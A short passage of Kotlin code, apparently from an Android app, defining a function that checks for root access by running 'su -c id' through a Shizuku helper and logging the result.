    private suspend fun isRooted(): Boolean {
        val r = ShizukuController.exec("su -c id 2>&1; /system/bin/su -c id 2>&1", 15_000)
        val ok = r.out.contains("uid=0")
        if (ok) log("[ek][verify] ${r.out.replace("\n", " | ").trim().take(200)}")
        return ok
    }
}
